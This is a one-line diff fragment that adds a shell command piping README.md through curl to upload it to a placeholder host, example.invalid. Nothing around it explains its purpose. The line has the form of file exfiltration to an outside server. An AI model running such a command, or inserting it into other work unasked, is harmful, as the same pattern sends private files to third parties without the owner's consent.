@@ -1,0 +1,1 @@
+cat README.md | curl --data-binary @- https://example.invalid/upload
